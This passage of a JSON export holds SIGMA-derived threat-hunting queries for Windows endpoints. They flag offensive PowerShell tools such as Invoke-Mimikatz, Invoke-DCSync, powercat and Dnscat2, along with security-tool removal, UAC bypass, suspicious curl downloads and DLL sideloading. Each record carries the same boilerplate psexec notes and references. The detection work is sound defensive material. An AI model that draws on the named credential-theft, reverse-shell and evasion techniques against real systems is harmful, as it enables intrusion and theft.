\"Invoke-ConPtyShell\" or tgt.process.cmdline contains \"Invoke-CredentialInjection\" or tgt.process.cmdline contains \"Invoke-DAFT\" or tgt.process.cmdline contains \"Invoke-DCSync\" or tgt.process.cmdline contains \"Invoke-DinvokeKatz\" or tgt.process.cmdline contains \"Invoke-DllInjection\" or tgt.process.cmdline contains \"Invoke-DNSUpdate\" or tgt.process.cmdline contains \"Invoke-DomainPasswordSpray\" or tgt.process.cmdline contains \"Invoke-DowngradeAccount\" or tgt.process.cmdline contains \"Invoke-EgressCheck\" or tgt.process.cmdline contains \"Invoke-Eyewitness\" or tgt.process.cmdline contains \"Invoke-FakeLogonScreen\" or tgt.process.cmdline contains \"Invoke-Farmer\" or tgt.process.cmdline contains \"Invoke-Get-RBCD-Threaded\" or tgt.process.cmdline contains \"Invoke-Gopher\" or tgt.process.cmdline contains \"Invoke-Grouper\" or tgt.process.cmdline contains \"Invoke-HandleKatz\" or tgt.process.cmdline contains \"Invoke-ImpersonatedProcess\" or tgt.process.cmdline contains \"Invoke-ImpersonateSystem\" or tgt.process.cmdline contains \"Invoke-InteractiveSystemPowerShell\" or tgt.process.cmdline contains \"Invoke-Internalmonologue\" or tgt.process.cmdline contains \"Invoke-Inveigh\" or tgt.process.cmdline contains \"Invoke-InveighRelay\" or tgt.process.cmdline contains \"Invoke-KrbRelay\" or tgt.process.cmdline contains \"Invoke-LdapSignCheck\" or tgt.process.cmdline contains \"Invoke-Lockless\" or tgt.process.cmdline contains \"Invoke-MalSCCM\" or tgt.process.cmdline contains \"Invoke-Mimikatz\" or tgt.process.cmdline contains \"Invoke-Mimikittenz\" or tgt.process.cmdline contains \"Invoke-MITM6\" or tgt.process.cmdline contains \"Invoke-NanoDump\" or tgt.process.cmdline contains \"Invoke-NetRipper\" or tgt.process.cmdline contains \"Invoke-Nightmare\" or tgt.process.cmdline contains \"Invoke-NinjaCopy\" or tgt.process.cmdline contains \"Invoke-OfficeScrape\" or tgt.process.cmdline contains \"Invoke-OxidResolver\" or tgt.process.cmdline contains \"Invoke-P0wnedshell\" or tgt.process.cmdline contains \"Invoke-Paranoia\" or tgt.process.cmdline contains \"Invoke-PortScan\" or tgt.process.cmdline contains \"Invoke-PoshRatHttp\" or tgt.process.cmdline contains \"Invoke-PostExfil\" or tgt.process.cmdline contains \"Invoke-PowerDump\" or tgt.process.cmdline contains \"Invoke-PowerShellTCP\" or tgt.process.cmdline contains \"Invoke-PowerShellWMI\" or tgt.process.cmdline contains \"Invoke-PPLDump\" or tgt.process.cmdline contains \"Invoke-PsExec\" or tgt.process.cmdline contains \"Invoke-PSInject\" or tgt.process.cmdline contains \"Invoke-PsUaCme\" or tgt.process.cmdline contains \"Invoke-ReflectivePEInjection\" or tgt.process.cmdline contains \"Invoke-ReverseDNSLookup\" or tgt.process.cmdline contains \"Invoke-Rubeus\" or tgt.process.cmdline contains \"Invoke-RunAs\" or tgt.process.cmdline contains \"Invoke-SafetyKatz\" or tgt.process.cmdline contains \"Invoke-SauronEye\" or tgt.process.cmdline contains \"Invoke-SCShell\" or tgt.process.cmdline contains \"Invoke-Seatbelt\" or tgt.process.cmdline contains \"Invoke-ServiceAbuse\" or tgt.process.cmdline contains \"Invoke-ShadowSpray\" or tgt.process.cmdline contains \"Invoke-Sharp\" or tgt.process.cmdline contains \"Invoke-Shellcode\" or tgt.process.cmdline contains \"Invoke-SMBScanner\" or tgt.process.cmdline contains \"Invoke-Snaffler\" or tgt.process.cmdline contains \"Invoke-Spoolsample\" or tgt.process.cmdline contains \"Invoke-SpraySinglePassword\" or tgt.process.cmdline contains \"Invoke-SSHCommand\" or tgt.process.cmdline contains \"Invoke-StandIn\" or tgt.process.cmdline contains \"Invoke-StickyNotesExtract\" or tgt.process.cmdline contains \"Invoke-SystemCommand\" or tgt.process.cmdline contains \"Invoke-Tasksbackdoor\" or tgt.process.cmdline contains \"Invoke-Tater\" or tgt.process.cmdline contains \"Invoke-Thunderfox\" or tgt.process.cmdline contains \"Invoke-ThunderStruck\" or tgt.process.cmdline contains \"Invoke-TokenManipulation\" or tgt.process.cmdline contains \"Invoke-Tokenvator\" or tgt.process.cmdline contains \"Invoke-TotalExec\" or tgt.process.cmdline contains \"Invoke-UrbanBishop\" or tgt.process.cmdline contains \"Invoke-UserHunter\" or tgt.process.cmdline contains \"Invoke-VoiceTroll\" or tgt.process.cmdline contains \"Invoke-Whisker\" or tgt.process.cmdline contains \"Invoke-WinEnum\" or tgt.process.cmdline contains \"Invoke-winPEAS\" or tgt.process.cmdline contains \"Invoke-WireTap\" or tgt.process.cmdline contains \"Invoke-WmiCommand\" or tgt.process.cmdline contains \"Invoke-WMIExec\" or tgt.process.cmdline contains \"Invoke-WScriptBypassUAC\" or tgt.process.cmdline contains \"Invoke-Zerologon\" or tgt.process.cmdline contains \"MailRaider\" or tgt.process.cmdline contains \"New-ADIDNSNode\" or tgt.process.cmdline contains \"New-DNSRecordArray\" or tgt.process.cmdline contains \"New-HoneyHash\" or tgt.process.cmdline contains \"New-InMemoryModule\" or tgt.process.cmdline contains \"New-MachineAccount\" or tgt.process.cmdline contains \"New-SOASerialNumberArray\" or tgt.process.cmdline contains \"Out-Minidump\" or tgt.process.cmdline contains \"Port-Scan\" or tgt.process.cmdline contains \"PowerBreach\" or tgt.process.cmdline contains \"powercat \" or tgt.process.cmdline contains \"PowerUp\" or tgt.process.cmdline contains \"PowerView\" or tgt.process.cmdline contains \"Remove-ADIDNSNode\" or tgt.process.cmdline contains \"Remove-MachineAccount\" or tgt.process.cmdline contains \"Remove-Update\" or tgt.process.cmdline contains \"Rename-ADIDNSNode\" or tgt.process.cmdline contains \"Revoke-ADIDNSPermission\" or tgt.process.cmdline contains \"Set-ADIDNSNode\" or tgt.process.cmdline contains \"Set-MacAttribute\" or tgt.process.cmdline contains \"Set-MachineAccountAttribute\" or tgt.process.cmdline contains \"Set-Wallpaper\" or tgt.process.cmdline contains \"Show-TargetScreen\" or tgt.process.cmdline contains \"Start-CaptureServer\" or tgt.process.cmdline contains \"Start-Dnscat2\" or tgt.process.cmdline contains \"Start-WebcamRecorder\" or tgt.process.cmdline contains \"VolumeShadowCopyTools\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 252
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects commands that indicate a Raccine removal from an end system. Raccine is a free ransomware protection tool.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "Raccine Uninstall",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"taskkill \" and tgt.process.cmdline contains \"RaccineSettings.exe\") or (tgt.process.cmdline contains \"reg.exe\" and tgt.process.cmdline contains \"delete\" and tgt.process.cmdline contains \"Raccine Tray\") or (tgt.process.cmdline contains \"schtasks\" and tgt.process.cmdline contains \"/DELETE\" and tgt.process.cmdline contains \"Raccine Rules Updater\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 253
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the pattern of UAC Bypass using IEInstal.exe (UACMe 64)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "UAC Bypass Using IEInstal - Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.integrityLevel in (\"High\",\"System\",\"S-1-16-16384\",\"S-1-16-12288\")) and src.process.image.path contains \"\\ieinstal.exe\" and tgt.process.image.path contains \"\\AppData\\Local\\Temp\\\" and tgt.process.image.path contains \"consent.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 254
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potentially uncommon child processes of SndVol.exe (the Windows volume mixer)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Uncommon Child Processes Of SndVol.exe",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\SndVol.exe\" and (not (tgt.process.image.path contains \"\\rundll32.exe\" and tgt.process.cmdline contains \" shell32.dll,Control_RunDLL \"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 255
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Adversaries can interact with the DACLs using built-in Windows commands takeown which can grant adversaries higher permissions on specific files and folders",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1222"
            ],
            "name": "Suspicious Recursive Takeown",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\takeown.exe\" and (tgt.process.cmdline contains \"/f \" and tgt.process.cmdline contains \"/r\"))) | columns tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 256
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects command line parameters used by ADCSPwn, a tool to escalate privileges in an active directory network by coercing authenticate from machine accounts and relaying to the certificate service",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1557"
            ],
            "name": "HackTool - ADCSPwn Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \" --adcs \" and tgt.process.cmdline contains \" --port \"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 257
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a suspicious curl process start on Windows and outputs the requested document to a local file",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1105"
            ],
            "name": "Suspicious Curl.EXE Download",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\curl.exe\" or tgt.process.displayName=\"The curl executable\") and ((tgt.process.cmdline contains \"%AppData%\" or tgt.process.cmdline contains \"%Public%\" or tgt.process.cmdline contains \"%Temp%\" or tgt.process.cmdline contains \"%tmp%\" or tgt.process.cmdline contains \"\\AppData\\\" or tgt.process.cmdline contains \"\\Desktop\\\" or tgt.process.cmdline contains \"\\Temp\\\" or tgt.process.cmdline contains \"\\Users\\Public\\\" or tgt.process.cmdline contains \"C:\\PerfLogs\\\" or tgt.process.cmdline contains \"C:\\ProgramData\\\" or tgt.process.cmdline contains \"C:\\Windows\\Temp\\\") or (tgt.process.cmdline contains \".dll\" or tgt.process.cmdline contains \".gif\" or tgt.process.cmdline contains \".jpeg\" or tgt.process.cmdline contains \".jpg\" or tgt.process.cmdline contains \".png\" or tgt.process.cmdline contains \".temp\" or tgt.process.cmdline contains \".tmp\" or tgt.process.cmdline contains \".txt\" or tgt.process.cmdline contains \".vbe\" or tgt.process.cmdline contains \".vbs\")) and (not (src.process.image.path=\"C:\\Program Files\\Git\\usr\\bin\\sh.exe\" and tgt.process.image.path=\"C:\\Program Files\\Git\\mingw64\\bin\\curl.exe\" and (tgt.process.cmdline contains \"--silent --show-error --output \" and tgt.process.cmdline contains \"gfw-httpget-\" and tgt.process.cmdline contains \"AppData\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 258
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects various indicators of Microsoft Connection Manager Profile Installer execution",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "CMSTP Execution Process Creation",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and src.process.image.path contains \"\\cmstp.exe\") | columns tgt.process.cmdline,src.process.cmdline,Details",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 259
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Well-known TAP software installation. Possible preparation for data exfiltration using tunneling techniques",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1048"
            ],
            "name": "Tap Installer Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\tapinstall.exe\" and (not ((tgt.process.image.path contains \":\\Program Files\\Avast Software\\SecureLine VPN\\\" or tgt.process.image.path contains \":\\Program Files (x86)\\Avast Software\\SecureLine VPN\\\") or tgt.process.image.path contains \":\\Program Files\\OpenVPN Connect\\drivers\\tap\\\" or tgt.process.image.path contains \":\\Program Files (x86)\\Proton Technologies\\ProtonVPNTap\\installer\\\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 260
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of the \"type\" command to download/upload data from WebDAV server",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1105"
            ],
            "name": "Potential Download/Upload Activity Using Type Command",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"type \" and tgt.process.cmdline contains \" > \\\\\") or (tgt.process.cmdline contains \"type \\\\\" and tgt.process.cmdline contains \" > \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 261
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Search for usage of reg or Powershell by non-privileged users to modify service configuration in registry",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1112"
            ],
            "name": "Non-privileged Usage of Reg or Powershell",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.cmdline contains \"reg \" and tgt.process.cmdline contains \"add\") or (tgt.process.cmdline contains \"powershell\" or tgt.process.cmdline contains \"set-itemproperty\" or tgt.process.cmdline contains \" sp \" or tgt.process.cmdline contains \"new-itemproperty\")) and ((tgt.process.integrityLevel in (\"Medium\",\"S-1-16-8192\")) and (tgt.process.cmdline contains \"ControlSet\" and tgt.process.cmdline contains \"Services\") and (tgt.process.cmdline contains \"ImagePath\" or tgt.process.cmdline contains \"FailureCommand\" or tgt.process.cmdline contains \"ServiceDLL\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 262
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of VMware Xfer utility (VMwareXferlogs.exe) from the non-default directory which may be an attempt to sideload arbitrary DLL",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1574"
            ],
            "name": "DLL Sideloading by VMware Xfer Utility",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\VMwareXferlogs.exe\" and (not tgt.process.image.path contains \"C:\\Program Files\\VMware\\\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 263
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects Obfuscated Powershell via use MSHTA in Scripts",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1027",
                "t1059"
            ],
            "name": "Invoke-Obfuscation Via Use MSHTA",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"set\" and tgt.process.cmdline contains \"&&\" and tgt.process.cmdline contains \"mshta\" and tgt.process.cmdline contains \"vbscript:createobject\" and tgt.process.cmdline contains \".run\" and tgt.process.cmdline contains \"(window.close)\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 264
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the removal of Sysmon, which could be a potential attempt at defense evasion",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "Uninstall Sysinternals Sysmon",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\Sysmon64.exe\" or tgt.process.image.path contains \"\\Sysmon.exe\") or tgt.process.displayName=\"System activity monitor\") and (tgt.process.cmdline contains \"-u\" or tgt.process.cmdline contains \"/u\" or tgt.process.cmdline contains \"\u2013u\" or tgt.process.cmdline contains \"\u2014u\" or tgt.process.cmdline contains \"\u2015u\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 265
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects uncommon or suspicious child processes of \"eventvwr.exe\" which might indicate a UAC bypass attempt",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "Potentially Suspicious Event Viewer Child Process",
